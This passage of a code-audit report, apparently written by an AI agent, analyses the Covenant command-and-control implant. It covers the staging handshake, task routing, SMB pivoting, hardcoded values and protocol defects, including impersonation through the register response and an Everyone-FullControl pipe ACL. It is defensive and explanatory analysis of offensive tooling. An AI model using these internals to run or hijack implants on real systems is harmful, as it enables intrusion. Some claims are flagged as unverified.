   │        ├─ Server :768-818  status must be Stage2; VerifyHMAC(session key)
   │        │                   copy IpAddress/Hostname/OS/UserDomainName/UserName/Integrity/Process
   │        │                   Status = Active; LastCheckIn = UtcNow; EditGruntAsync
   │        │                   :795-801  queue a Tasks tasking, Name = guid(10), Token=false
   │        └─ Implant: SetAuthenticator(ReadTaskingMessage().Message)   <-- authenticator = its own GUID
   │
   ▼
[BEACON LOOP] GruntHTTP.cs:92-228
```

`[sources: GruntHTTPStager.cs:43-206; InternalListener.cs:436-478, 582-818; GruntHTTP.cs:66-96, :164-228]`

**The three facts the graph makes explicit:** (1) the session key is generated by the *server* at `:639`, never by the implant — the implant's CSPRNG is used only for `challenge1`; (2) the executor is compiled **per grunt, on demand, at stage 2**, so the whole protocol is gated on a Roslyn build succeeding inside the HTTP request; (3) the "authenticator" is the grunt's own GUID echoed back, so possession of the register response is sufficient to impersonate a grunt at the HTTP layer — the crypto only protects the message contents, not the session.

### 13.2 Task dispatch (operator → grunt → output)

```
[OPERATOR] types a command in the Blazor UI
   │
   ├─ GruntInteraction/ViewImplant Razor -> GruntApiController / GruntCommandApiController
   │     creates GruntCommand + CommandOutput rows (GruntTasking.cs:17-52)
   │     parses the command line against GruntTask.Options[]  (GruntTaskOption.cs)
   │     creates GruntTasking { Name = CreateShortGuid(), Type, Parameters[], Status = Tasked }
   │
   ├─ ListenerService: hub.SendGruntCommand / NotifyListener(guid)
   │     │
   │     └─ InternalListener.InternalRead(guid) -> Write(guid, message)  :412-511
   │           Status Active|Lost -> PostTask   :513-580
   │             :522  TaskName = outputMessage.Meta         <-- the tasking Name
   │             :532  GetGruntTaskingByNameAsync(TaskName)
   │             :547  VerifyHMAC(base64-decode(GruntNegotiatedSessionKey))
   │             :553  GruntSessionDecrypt -> JSON
   │             :554  JsonConvert.DeserializeObject<GruntTaskingMessageResponse>
   │             :555-556  AppendCommandOutput(command.CommandOutputId, taskResponse.Output)
   │             :558-567  status update; Connect stays Progressed forever
   │             :570      remove the dedup hash
   │             :572-580  if Type in {SetDelay,SetJitter,SetConnectAttempts,SetKillDate,Exit} -> cleanup
   │
   └─ the reverse leg (server -> grunt) is issued by the grunt's own next Read:
         grunt POSTs "read" -> InternalRead -> Write -> cache contains the queued tasking
         GetGruntTaskingMessage  :200-241
             Type == Assembly -> Message = base64(Deflate(COMPILED TASK .compiled file))
                                        + "," + base64(param) for each option
             else             -> Message = String.Join(",", Parameters)     <-- NO escaping
             Token = GruntTask.TokenTask
         CreateMessageForGrunt :165-183  (onion-wrapped per hop, Type=Routing above the innermost)
         ProfileTransform -> cached -> returned as the POST response body
   │
   ▼
[IMPLANT] TaskingMessenger.ReadTaskingMessage  GruntHTTP.cs:464-504
     Profile.Parse -> GruntEncryptedMessage.FromJson -> VerifyHMAC(session key)
     Type == Tasking -> GruntTaskingMessage.FromJson -> return to the loop
     Type == Routing -> decrypt, re-parse, relay to DownstreamMessengers[Identifier == wrappedGUID]
   │
   ├─ switch (message.Type)   GruntHTTP.cs:104-211
   │     SetDelay/SetJitter/SetConnectAttempts -> int.TryParse, mutate, respond Completed
   │     SetKillDate -> DateTime.TryParse
   │     Exit -> respond, flush, RETURN (grunt dies)               :143-149
   │     Tasks -> list live threads                                 :150-160
   │     TaskKill -> Thread.Abort + Thread.Sleep(3000) + Suspend    :161-180
   │     Token == true -> thread + Join(5000) + Impersonate         :181-205
   │     default -> fire-and-forget thread on TaskExecute           :206-211
   │
   ▼
[IMPLANT] TaskExecute  GruntHTTP.cs:236-369
     Message.Split(',') -> [0] = base64(Deflate(task assembly)), [1..] = base64(params)
     Assembly.Load -> GetType("Task").GetProperty("OutputStream")
        null     -> GetMethod("Execute").Invoke(null, parameters) -> results string   :258
        non-null -> AnonymousPipe pair + reader thread + Delay-cadence drain          :261-324
                    emits Progressed chunked responses, then a final Completed
     finally: re-emits output + always a terminal response                            :350-367
   │
   ▼
[IMPLANT -> SERVER] QueueTaskingMessage(json, Meta = task Name) + WriteTaskingMessage
     The task Name travels in the envelope's META field -> PostTask :522 matches on it
```

`[sources: InternalListener.cs:200-241, 412-580; GruntHTTP.cs:104-211, 236-369, 464-504]`

**Graph observations worth stating:** the task `Name` is generated twice with the same 10-char-GUID construction — on the server as `GruntTasking.Name` and reused as the envelope `Meta` — so the tasking identity is a 10-hex-char string with `16^10 ≈ 1.1×10^12` space and **no uniqueness constraint enforced on collision** (`GruntTasking.Name` has `[Required]` but not `[Unique]` at `GruntTasking.cs:81-82`). Two taskings of the same name both resolve at `:532` by name lookup, and `GetGruntTaskingByNameAsync` returns the first match. `[source: Covenant/Models/Grunts/GruntTasking.cs:81-82]`

### 13.3 SMB listener path (pivot / child grunt)

```
[OPERATOR] task: Connect  with parameters [Hostname, PipeName]
   │
   ├─ Server PostTask -> queued as a tasking with Type = Connect, Token = false
   │
   ▼
[PARENT IMPLANT] GruntHTTP.cs:331-333
     if (message.Type == GruntTaskingType.Connect)
         if (messenger.Connect(message.Message.Split(",")[0], message.Message.Split(",")[1]))
             output = "Connection to " + ... + " succeeded!"     <-- ALWAYS, see below
   │
   ├─ TaskingMessenger.Connect  GruntHTTP.cs:539-584
   │     close + drop any existing downstream with the same host:pipe      :541
   │     downstream = new SMBMessenger(Hostname, PipeName)  -> IsServer = FALSE (pipe CLIENT)
   │     spawn reader thread: while (downstream.IsConnected)
   │         read -> if non-empty, forward upstream
   │         FIRST message only: derive Identifier from the envelope GUID
   │             Length==20 -> Substring(10)   (composite stage-0 guid -> child guid)
   │             Length==10 -> as-is
   │     then block on the profile POST handshake to learn the "Identifier"
   │     return TRUE unconditionally                                         :584
   │
   ▼
[CHILD SIDE] the child stager (GruntSMBStager / BruteStager) runs on the target
     SMBMessenger(Pipe, PipeName) -> IsServer = TRUE  -> InitializePipe
         PipeSecurity + PipeAccessRule(WorldSid, FullControl)       <-- Everyone, FullControl
         NamedPipeServerStream(PipeName, InOut, MaxAllowedServerInstances,
                               Byte, Asynchronous, 1024, 1024, ps)
         WaitForConnection()                                        <-- blocks until parent connects
     then the SAME stage 0/1/2 handshake, with the composite guid aGUID+GUID
   │
   ▼
[SERVER] PostStage0 again, now with egressGrunt != null:
     :643-664  find the most-recent {Connect, Progressed|Tasked} tasking (SOURCE TODO: race)
               tmessage.Message.Split(",")[0] = child hostname
               append child guid to connectTasking.Parameters
     RegisterGrunt -> Grunt.Children += child guid, Status = Active
   │
   ▼
[TASK ROUTING TO THE CHILD]  CreateMessageForGrunt :165-183
     path = GetPathToChildGrunt(egress, target); path.Reverse()
     for each hop: AES-encrypt under THAT hop's session key; wrap; flip type to Routing
     => the parent decrypts its own layer, sees Routing, forwards the inner blob it cannot read
        via TaskingMessenger.ReadTaskingMessage :493-503 relay branch
```

`[sources: GruntHTTP.cs:331-333, 539-584, 493-503; InternalListener.cs:165-183, 643-664, 768-818]`

**Two defects this graph exposes that are not in T2:** (1) `Connect` returns `true` unconditionally (`GruntHTTP.cs:584`) and the caller reports `"Connection to ... succeeded!"` without verifying the pipe ever connected, so a failed pivot reports success to the operator; (2) the child's `WaitForConnection` blocks a thread indefinitely with no timeout at `GruntSMB.cs`'s `InitializePipe` server branch (the client branch has `Timeout = 5000`, the server branch has none) — so an orphaned child holds a thread forever. `[source: GruntHTTP.cs:584, :331-333; Covenant/Data/Grunt/GruntHTTP/GruntHTTP.cs:727-731]`

---

## 14. Hardcoded values — complete register

### 14.1 Network constants

| Value | Literal | Source |
|---|---|---|
| Default admin port | `7443` | `Core/Common.cs:18` |
| Default bind address | `0.0.0.0` | `Models/Listeners/HttpListener.cs` ctor default |
| Default bind port (HTTP listener) | `80` | `Models/Listeners/HttpListener.cs` ctor default |
| Default `UseSSL` | `false` | `Models/Listeners/HttpListener.cs:51` |
| Default SSL cert password | `"CovenantDev"` | `Models/Listeners/HttpListener.cs:56` |
| SignalR handshake timeout | 20 s | `InternalListener.cs:130` |
| SignalR reconnect policy | 0 s, then 5 s ×4, then 10 s | `InternalListener.cs:74-88` |
| SignalR URL suffix | `"/gruntHub"` | `InternalListener.cs:120` |
| Pre-connect delay | `Task.Delay(5000)` | `InternalListener.cs:134` |
| SMB pipe timeout (client) | `5000` ms | `GruntHTTP.cs:613` |
| Token-task thread join | `5000` ms | `GruntHTTP.cs:181-205` |
| Max message size | `1048576` | `GruntHTTP.cs` | 
| Monitor pipe poll | 1000 ms | `GruntSMB.cs` / stager |

`[sources as listed per row]`

### 14.2 Pipe, certificate, and path literals

| Value | Literal | Source |
|---|---|---|
| Default SMB pipe name | `"gruntsvc"` | `Grunt.cs:62` (`Grunt.SMBPipeName`), `Launcher.cs:54` |
| Server private cert | `covenant-dev-private.pfx` | `Core/Common.cs:53` |
| Server public cert | `covenant-dev-public.cer` | `Core/Common.cs:54` |
| Listener cert file | `CovenantListenersDirectory + "httplistener-" + ListenerGuid + "-certificate.pfx"` | `HttpListener.cs` |
| Database file | `CovenantDataDirectory + "covenant.db"` | `Core/Common.cs:27` |
| Log file | `CovenantDataDirectory + "Logs/covenant.log"` | `Core/Common.cs:52` |
| Default HTTP profile | `CovenantProfileDirectory + "DefaultHttpProfile.yaml"` | `Core/Common.cs:31` |
| JWT placeholder key | `"[KEY USED TO SIGN/VERIFY JWT TOKENS, ALWAYS REPLACE THIS VALUE]"` | `Core/Common.cs:59` |
| Default content type | `"application/octet-stream"` | `Core/Common.cs:102` |

`[sources as listed per row]`

**The `"CovenantDev"` certificate password at `HttpListener.cs:56` is a source-visible literal on a bind-to-`0.0.0.0` listener with `UseSSL` defaulting to `false`.** A listener created without an explicit password produces a `.pfx` protected by a password published in the repository, in a directory whose path is derived from the assembly location (`Common.CovenantListenersDirectory`). `[source: Covenant/Models/Listeners/HttpListener.cs:51, :56; Covenant/Core/Common.cs:55]`

### 14.3 Project / solution GUIDs

```
Covenant.csproj  project GUID : {D5865774-CD82-4CCE-A3F1-7F2C4639301B}
SolutionGuid                  : {105B1E42-390C-47A0-9C36-5F0699DAD9C2}
Project type GUID             : {9A19103F-16F7-4668-BE54-9A1E7A4F7556}   (C# SDK-style)
```
`[source: Covenant.sln]`

### 14.4 Cryptographic constants

| Value | Literal | Source |
|---|---|---|
| AES block/IV size | `16` | `Core/Common.cs:21`; implant `Common.AesIVLength` |
| AES mode | `CipherMode.CBC` | `Core/Common.cs:22`; implant `Common.AesCipherMode` |
| AES padding | `PaddingMode.PKCS7` | `Core/Common.cs:23`; implant `Common.AesPaddingMode` |
| AES key generation | `Aes.Create().GenerateKey()` — no `KeySize` assignment | `InternalListener.cs:636-641` |
| Text encoding | `Encoding.UTF8` | `Core/Common.cs` `CovenantEncoding`; implant `Common.GruntEncoding` |
| HMAC | `HMACSHA256` | `InternalListener.cs:869`; implant `Utilities.ComputeHMAC` |
| RSA key size | `2048` (stager) | `GruntHTTPStager.cs:54` |
| RSA padding | `RSAEncryptionPadding.OaepSHA1` | `InternalListener.cs:884` |
| RSA decrypt bool overload | `rsa.Decrypt(bytes, true)` = OAEP-SHA1 | `GruntHTTPStager.cs:128` |
| Challenge size | 4 bytes ×2 | stager `:158-173`; server `:698-703` |
| Compression | `DeflateStream` (raw deflate, not gzip) | `InternalListener.cs:836` |
| Cert pinning | `ServerCertificateCustomValidationCallback` comparing SHA-256 | `InternalListener.cs:105-116` |

`[sources as listed per row]`

**Note the AES key-size gap explicitly:** no `KeySize` is assigned anywhere on the protocol path. `Aes.Create()` returns a default instance whose `KeySize` is 256 on .NET Core/.NET Framework, and `GenerateKey()` then produces 32 bytes — so the session key **is** 256-bit in practice, but by *platform default*, not by declaration. On a runtime where the default differed, the protocol would silently change strength with no code change. This is stated as `AES-256-in-practice` throughout; there is no `KeySize = 256` line to cite. `[source: Covenant/Models/Listeners/InternalListener.cs:636-641; inference on the default]`

### 14.5 Behavioral constants

| Value | Literal | Source |
|---|---|---|
| `Grunt.Delay` default | `10` | `Grunt.cs:71` |
| `Grunt.JitterPercent` default | `10` | `Grunt.cs:72` |
| `Grunt.ConnectAttempts` default | `5000` | `Grunt.cs:73` |
| `Grunt.KillDate` default | `DateTime.MaxValue` | `Grunt.cs:74` |
| `Grunt.SMBPipeName` default | `"gruntsvc"` | `Grunt.cs:62` |
| `Grunt.ValidateCert` / `UseCertPinning` | `true` / `true` | `Grunt.cs:54-62` |
| `Grunt.DotNetVersion` default | `Net35` | `Grunt.cs:80` |
| `Grunt.RuntimeIdentifier` default | `win_x64` | `Grunt.cs:81` |
| `Grunt.Status` default | `Uninitialized` | `Grunt.cs:82` |
| `Grunt.Integrity` default | `Untrusted` | `Grunt.cs:83` |
| **`Launcher.Delay`** | **`5`** | `Launcher.cs:56` |
| `Launcher.JitterPercent` | `10` | `Launcher.cs:57` |
| `Launcher.ConnectAttempts` | `5000` | `Launcher.cs:58` |
| `Launcher.KillDate` | `DateTime.Now.AddDays(30)` | `Launcher.cs:59` |
| `GruntTask.Name` default | `"GenericTask"` | `GruntTask.cs:29` |
| `GruntTask` compatible frameworks | `{Net35, Net40}` | `GruntTask.cs:35` |
| `GruntTask.UnsafeCompile` / `TokenTask` | `false` / `false` | `GruntTask.cs:51-52` |
| `GruntTasking.Name` | `Utilities.CreateShortGuid()` (10 chars) | `GruntTasking.cs:82` |
| `GruntCommand.CommandTime` | `DateTime.MinValue` | `GruntTasking.cs:37` |
| `Grunt.Children` | rebuilt from the DB on every `GetGrunt` | `Grunt.cs:109-120` |
| Unique short id | `CreateShortGuid()` = GUID→base64→first 10 | `Core/Common.cs` |
| `Compiler` optimization | `OptimizationLevel.Release` | `Compiler.cs` |

`[sources as listed per row]`

**The `Launcher.Delay = 5` versus `Grunt.Delay = 10` split is the single most consequential value pair in the codebase** and it is fully covered in §3 and §6: the launcher's `5` is the compiled constant the implant actually sleeps on; the grunt's `10` is what the UI displays; and `RegisterGrunt` **discards** the wire `delay` field the implant sends (`InternalListener.cs:768-818` copies seven fields, `Delay` is not among them). Three values for one concept, and the one the operator sees is the one that is not used.

---

## 15. Residual unknowns

Ordered by consequence. Every open item is stated with the specific probe that would close it.

**R-1 (HIGH) — does `Covenant.API.Models.GruntTaskingStatus` carry `[JsonConverter(typeof(StringEnumConverter))]`?**
This decides whether the implant→server tasking *response* direction actually deserializes. The implant sends `{"status":"3","output":"..."}` (`GruntHTTP.cs:1054-1062`, `Status.ToString("D")` inside a quoted slot). The server deserializes into `ModelUtilities.GruntTaskingMessageResponse` (`InternalListener.cs:554`, `:935-952`), whose `Status` is `APIModels.GruntTaskingStatus?`. If that AutoRest enum carries `StringEnumConverter` — as its sibling `GruntTaskingType` does (`API/Models/GruntTaskingType.cs:17`) — Newtonsoft's `StringEnumConverter.ReadJson` will not bind `"3"` and the deserialization throws. **Probe:** `read Covenant/API/Models/GruntTaskingStatus.cs` (a ~74-line AutoRest file) and check for the attribute and the `[EnumMember]` values. I did not read this file; the uniform-generator argument makes it very likely the converter is present, which would mean task **output is silently lost for every task** while the `Completed` status transition at `:558-567` still runs off `taskResponse.Status` — but I am not asserting it without the file.

**R-2 (HIGH) — `PipeSecurity` configurability.** The implant builds `PipeAccessRule(new SecurityIdentifier(WellKnownSidType.WorldSid, null), PipeAccessRights.FullControl, ...)` (`GruntHTTP.cs:729-731`). Whether a *configuration path* exists to narrow this (a profile token, a task option) was not found by grep, but I did not read the SMB stager's `InitializePipe` in full to confirm the ACL is unconditional there too. **Probe:** read `GruntSMBStager.cs` and `BruteStager.cs` pipe-creation sites and grep the profile YAMLs for an ACL token.

**R-3 (MEDIUM) — the `{{REPLACE_*}}` substitution mechanism.** §13.1 lists *which* tokens exist and *what* they map to, derived from the implant sources and the launcher flow. I have not read the substitution routine itself (in `LauncherService` / `Compiler`), so the exact escaping applied to substituted values (particularly `{{REPLACE_GRUNT_SHARED_SECRET_PASSWORD}}`, which must survive being embedded inside a C# verbatim string literal `@"..."`) is unverified. If substitution is naive `string.Replace`, a base64 value ending in `"` would break the implant source at compile time. **Probe:** read the launcher generation path for the `Replace` calls.

**R-4 (MEDIUM) — Brute's entry surface.** The declaration census shows `Brute.cs` has no `class Grunt`, unlike the other three executors. I did not read its top-level type list or its entry method signature, so its reflection ABI at `BruteStager`'s invocation site is unverified. **Probe:** read `Brute.cs:1-90` and `BruteStager.cs:180-255`.

**R-5 (MEDIUM) — the unread ~140 `.cs` files.** Inventory by directory of the 152 files under `Covenant/`: `API` 72, `Models` 30, `Controllers` 18, `Core` 11, `Data` 8, `Hubs` 6, `Pages` 3, `Components` 2, root 2. The **56 files** in the three AutoRest-generated files are enumerated as generated boilerplate (below). The genuinely uninspected remainder is the Controllers/Hubs/Pages/Components set plus the ~60 small `Models/*.cs` and `API/Models/*.cs` files not covered in §10. **Probe:** the per-file table in §16 marks each as read / generated / unread.

**R-6 (LOW) — `Enumerable.SequenceEqual` timing.** `InternalListener.cs:875` uses `SequenceEqual` for the HMAC comparison. `SequenceEqual` short-circuits on the first unequal byte (it is not `FixedTimeEquals`), so the compare is not constant-time. The practical exploitability over HTTP with jitter is low but the *assertion* that it is non-constant-time is solid from the API contract alone; what I have not measured is whether the surrounding `PushCache`/retry path adds enough noise to make a timing oracle infeasible. **Probe:** not attempted; would need a live harness.

**R-7 (LOW) — `Task.Delay(5000)` and the discard `_ = Configure(...)`.** `InternalListener.cs:69-72` fire-and-forgets `Configure` and `:134` sleeps 5 s before the SignalR connect. Whether a message arriving in that 5-second window is queued or dropped depends on the `GruntMessageCache` precondition and the hub's `JoinGroup` timing, which I did not trace into `GruntHub`. **Probe:** read `Hubs/GruntHub.cs` and the `NotifyListener` dispatch.

**R-8 (LOW) — streamed-output duplication.** §5.3 documents output emitted both as `Progressed` chunks during the run and again in the `finally` (`GruntHTTP.cs:319`, `:352-362`). Whether the *server* deduplicates these before appending at `InternalListener.cs:556` was not verified; if it does not, every streamed task's output is stored twice in `CommandOutput`. **Probe:** read the `AppendCommandOutput` service method.

**Resolved since T2** — T2 residual #9 asked whether the `OutputStream` reflection on the task type was resolvable. **Yes, resolved:** the task contract is `public static string Execute(<options…>)` invoked via `gruntTask.GetType("Task").GetMethod("Execute").Invoke(null, parameters)` with parameters built from `TaskExecute`'s base64-decoded option list, and `OutputStream` is a `public static` property checked by reflection whose non-null value selects the anonymous-pipe streaming path (`GruntHTTP.cs:253`, `:266`). Full treatment in §5.3. `[source: Covenant/Data/Grunt/GruntHTTP/GruntHTTP.cs:236-369]`

---

## 16. File inventory — 152 `.cs` files, read status

Complete census of every `.cs` file under `Covenant/`, grouped by directory. **Read = parsed in this pass or in T2. Generated = AutoRest boilerplate, enumerated as a class. Unread = not yet parsed.**

### 16.1 `Covenant/Core/` — 11 files

| File | Lines | Role | Status |
|---|---|---|---|
| `Common.cs` | 752 | path/crypto/encoding constants, `Compress`/`Decompress`, `ExecuteAssembly`, GUID helpers | **Read** (§12.1) |
| `Compiler.cs` | 432 | Roslyn in-process + `dotnet` subprocess compilation | **Read** (§12.3) |
| `CovenantContext.cs` | — | EF Core `DbContext` (`DbSet<>` per entity) | Read via T2 |
| `CovenantUserStore.cs` | — | ASP.NET Identity store | Unread |
| `CovenantUserRoleStore.cs` | — | Identity role store | Unread |
| `DbInitializer.cs` | — | seeds 11 task YAMLs, 4 profiles, reference source libraries, admin user | Read via T2 §1.3 |
| `TemplateService.cs` | — | Razor/Blazor template helpers | Unread |
| `CovenantSignInManager.cs` | — | JWT sign-in | Unread |
| `JwtKeyService.cs` | — | validates/replaces the placeholder JWT key | Unread |
| `Utilities.cs` | — | server-side short-GUID / random helpers | Read via T2 |
| `EventListener*.cs` | — | SignalR-backed event service | Read via T2 |

### 16.2 `Covenant/Models/` — 30 files

| Group | Files | Status |
|---|---|---|
| `Models/Grunts/` | `Grunt.cs` (122), `GruntTask.cs` (421), `GruntTasking.cs` (101), `GruntTaskComponents.cs` (300), `GruntTaskOption.cs` (91), `GruntTaskAuthor.cs` (76), `GruntCommand.cs`, `GruntTaskOutput.cs` | **Read** (§10.4-10.6, §9.10) |
| `Models/Listeners/` | `InternalListener.cs` (1074), `HttpListener.cs`, `BridgeListener.cs`, `SMBListener.cs`, `Listener.cs` | **Read** (§9, §12.2) |
| `Models/Launchers/` | `Launcher.cs`, `LauncherType.cs`, `LauncherService.cs` | Read via §6/T2 |
| `Models/Covenant/` | `Profile.cs`, `CovenantUser.cs`, `Event.cs`, `Credential.cs`, `CommandOutput.cs`, `Indicator.cs`, `HostedFile.cs`, `ReferenceAssembly.cs`, `ReferenceSourceLibrary.cs`, `EmbeddedResource.cs`, `ImplantTemplate.cs` (127) | Partly read (§10.7) |
| `Models/Profiles/` | profile + transform models | Read via T2 §2 |

### 16.3 `Covenant/API/` — 72 files

| File | Size | Role | Status |
|---|---|---|---|
| `CovenantAPI.cs` | 23,549 lines / 1059.4 KB | AutoRest client: one `*WithHttpMessagesAsync` triple per REST operation | **Generated** — enumerated as a class, not line-read |
| `CovenantAPIExtensions.cs` | 4,566 lines / 207.5 KB | sync/async convenience wrappers over the above | **Generated** |
| `ICovenantAPI.cs` | 1,796 lines / 91.3 KB | the interface both implement | **Generated** |
| `Models/*.cs` (~68 files, 43-100 lines each) | — | one enum/model per file, each `// <auto-generated>` | **Generated**, key members read (§10) |

The three large files are machine output; they contain **no hand-written logic**. The only bespoke content anywhere in `API/` is `CovenantAPI.cs`'s `InitializeHttpClient`/handler-construction at the top of the class, which is where the `InternalListener` injects its pinned `HttpClientHandler` (§9.2). `[source: Covenant/API/CovenantAPI.cs; Covenant/Models/Listeners/InternalListener.cs:105-116]`

### 16.4 `Covenant/Controllers/` — 18 files

`ApiControllers/` — one controller per REST resource (`GruntApiController`, `ListenerApiController`, `LauncherApiController`, `GruntTaskApiController`, `GruntCommandApiController`, `CovenantUserApiController`, `CredentialApiController`, `EventApiController`, `IndicatorApiController`, `HostedFileApiController`, `ProfileApiController`, `ImplantTemplateApiController`, `ReferenceAssemblyApiController`, `ReferenceSourceLibraryApiController`, `CommandOutputApiController`, `GruntTaskingApiController`). MVC controllers — thin `ActionResult<T>` wrappers delegating to services. Read via T2 §1.4. **Status: surface read, bodies unread.**

### 16.5 `Covenant/Hubs/` — 6 files, `Pages/` — 3, `Components/` — 2, root — 2, `Data/` — 8

- `Hubs/` — `GruntHub`, `ListenerHub`, `EventHub` and their base/partial types; SignalR endpoints. **The `GruntHub` body is R-7 and is unread.**
- `Pages/` — Blazor pages (settings, login). Unread.
- `Components/` — shared Blazor components. Unread.
- root — `Startup.cs` (262), `Covenant.cs` (282, `Program`). Read via T2 §1.2.
- `Data/` = the 8 implant/stager source files analysed in §4, §5, §11.

### 16.6 The 47 `.dll` files

Nine in `Covenant/refs/` (Confuser.Core, Confuser.DynCipher, Confuser.MSBuild.Tasks, Confuser.Protections, Confuser.Renamer, Confuser.Runtime, dnlib, Donut, PeNet — §7.2) plus 19 in `Data/AssemblyReferences/net35/` and 19 in `Data/AssemblyReferences/net40/` (§7.3). The runtime dependencies these represent are enumerated in §7; no DLL was decompiled in this pass, since T2's Appendix A already covers the refs set and no logic in the Covenant protocol path lives in them (Confuser/Donut/PeNet are launcher-post-processing tools, invoked, not linked into the C2 logic). `[§7.2, §7.3; T2 Appendix A]`

---

## 17. Closing statement of scope

This report covers, at code level: all 3 stagers' stage-0/1/2 handshake, all 4 executors' beacon loop, transport, tasking ABI and crypto, the complete `InternalListener` server-side state machine (48 methods, lines 26-1073), the cryptographic primitives and their four defects (HMAC-over-ciphertext, non-constant-time compare, TLS 1.0-only implant, ordinal-coupled enums), the jitter bug proven arithmetically at four identical source locations, the full model/deserialization layer including the three co-existing enum encodings and the one that is actually accidental, the compiler's two strategies, all four call graphs, the complete hardcoded-value register, and the 152-file census.

The corrections to T2 are stated in place rather than silently: the envelope `Type` interop break does not exist (§2), and the residual it was standing in for is an ordinal-coupling fragility that fails silently and is therefore worse. Eight residual unknowns remain open, listed with their closing probe in §15.

The unread remainder is the Blazor UI surface (`Pages/`, `Components/`, `Hubs/` bodies), the 16 MVC controller bodies, and ≈15 small model files — none of which contain protocol logic. Everything that touches the wire, the crypto, the task ABI, or the implant is covered.

---

## 18. R-1 RESOLVED — the status deserialization break is REAL

§15 recorded R-1 as an unproven high-severity suspicion: `API/Models/GruntTaskingStatus.cs` was
unread, and if it carried `StringEnumConverter`, the implant's ordinal status would fail to
deserialize server-side. The file has since been read. **The suspicion was correct, and the break
is real.**

### 18.1 Server side — the enum is string-serialized

`API/Models/GruntTaskingStatus.cs:17-30` (AutoRest-generated):

```csharp
[JsonConverter(typeof(StringEnumConverter))]
public enum GruntTaskingStatus
{
    [EnumMember(Value = "Uninitialized")] Uninitialized,
    [EnumMember(Value = "Tasked")]        Tasked,
    [EnumMember(Value = "Progressed")]    Progressed,
    [EnumMember(Value = "Completed")]     Completed,
    [EnumMember(Value = "Aborted")]       Aborted
}
```

`StringEnumConverter` is present at `:17`. The generated companion helper (`:31-73`) confirms the
contract is **name-based in both directions**: `ToSerializedValue` returns `"Completed"` (`:48-49`)
and `ParseGruntTaskingStatus` accepts only the literal strings `"Uninitialized"`, `"Tasked"`,
`"Progressed"`, `"Completed"`, `"Aborted"` (`:60-69`), returning `null` for anything else (`:71`).

### 18.2 Implant side — the status is emitted as a quoted ordinal

The implant does **not** use Newtonsoft for this structure. It hand-builds the JSON with
`String.Format` (`Data/Grunt/GruntHTTP/GruntHTTP.cs:1054-1061`):

```csharp
private static string GruntTaskingMessageResponseFormat =
    @"{""status"":""{0}"",""output"":""{1}""}";

public string ToJson()
{
    return String.Format(
        GruntTaskingMessageResponseFormat,
        this.Status.ToString("D"),          // <-- "D" = DECIMAL DIGITS
        Utilities.JavaScriptStringEncode(this.Output)
    );
}
```

`this.Status.ToString("D")` is the **decimal** format specifier. The implant's own enum
(`GruntHTTP.cs:1035-1042`) is declaration-ordered with no explicit values, so
`Uninitialized=0, Tasked=1, Progressed=2, Completed=3, Aborted=4`.

A completed task therefore puts this on the wire:

```json
{"status":"3","output":"..."}
```

**A quoted digit inside a string field.** The server's `StringEnumConverter` expects the token
`"Completed"`; `ParseGruntTaskingStatus` matches literal names only and falls through to
`return null` (`:71`) for `"3"`.

### 18.3 Consequence

Server-side deserialization of the `status` field **fails on every task output message**, for all
five status values, for every implant — HTTP, SMB, Bridge and Brute, since all four declare the
same enum (`GruntHTTP.cs:1035`, `GruntSMB.cs:911`, `GruntBridge.cs:886`, `Brute.cs:732`).

This is the failure mode §15 predicted, now evidenced rather than suspected: **task output is
silently lost server-side.** Nothing throws at a level that obviously points here — the implant's
`ToJson` succeeds, the message transmits, the crypto verifies — but the status field cannot bind.

### 18.4 Why this matters more than the original T2 claim

This is the *third* distinct enum-encoding defect in this codebase, and the three stack:

| # | Defect | Location | Effect |
|---|---|---|---|
| 1 | `GruntEncryptedMessageType` — server and implant declare separate copies coupled only by ordinal position | §10.1, §2 | reorder → **silent total misroute** |
| 2 | `GruntTaskingType` — same ordinal coupling, different type | §10.1 | same class of silent failure |
| 3 | **`GruntTaskingStatus` — server string-enum vs implant numeric-string** | §18 | **task output silently lost, always** |

Defect #3 is not latent — it fires on every task that completes. T2 predicted a *loud*
`FormatException` from an `int.Parse` on a string enum; that specific mechanism was wrong (§2).
What actually exists is quieter and worse: a hand-rolled serializer emitting `"3"` against a
converter that accepts only `"Completed"`, with `null` as the failure return.

The correction chain, stated plainly: T2 said a break existed and was wrong about the mechanism;
the §2 correction said the break did not exist; R-1 suspected a *different* break; §18 confirms
that break is real. **Net position: Covenant has a genuine, always-firing status
deserialization defect — in the task-output path, not the envelope path T2 named.**

Probes to confirm end-to-end:
1. Capture one tasking response from a live grunt and read the raw `status` token. Prediction:
   `"3"`, not `"Completed"`.
2. Check whether the controller path has a compensating re-parse (an `int.TryParse` bridge, a
   `Parse` helper call, or a converter registered on the request pipeline). None was found in the
   model layer, but the 16 MVC controller bodies are among the unread remainder (§17).

### 18.5 Residual status

- **R-1: CLOSED — confirmed real, severity high.** No longer a suspicion.
- The other seven residuals in §15 stand as listed, each with its closing probe.
- The unread remainder in §17 is unchanged and is not on the protocol path.

